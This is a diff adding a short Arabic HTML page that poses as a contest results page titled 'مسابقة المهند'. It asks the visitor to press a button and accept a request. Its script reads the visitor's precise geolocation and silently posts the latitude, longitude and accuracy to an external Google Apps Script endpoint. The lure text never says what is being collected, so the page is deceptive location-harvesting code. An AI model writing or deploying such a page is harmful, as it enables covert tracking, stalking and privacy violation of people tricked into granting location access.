@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مسابقة المهند</title>
+<style>
+body{font-family:Arial;text-align:center;margin-top:40px}
+button{padding:12px 20px;font-size:16px;cursor:pointer}
+</style>
+</head>
+<body>
+
+<h2> عرض النتيجة</h2>
+<p> اضغط الزر ثم وافق علي الطلب</p>
+<button onclick="sendLocation()">إرسال طلب</button>
+
+<script>
+function sendLocation() {
+  if (!navigator.geolocation) {
+    alert("المتصفح لا يدعم إرسال الطلبات");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      fetch("https://script.google.com/macros/s/AKfycbzw7qGmEnbRdcPVZOVIwH7_A31eqpE4g3ds9-0Adv2cmm-7M1Hlm8MAaHFTPGqVixmPlA/exec", {
+        method: "POST",
+        body: JSON.stringify({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy
+        })
+      })
+      .then(() => alert("تم إرسال الطب بنجاح"))
+      .catch(() => alert("حدث خطأ أثناء الإرسال"));
+    },
+    () => alert("تم رفض الإذن")
+  );
+}
+</script>
+
+</body>
+</html>
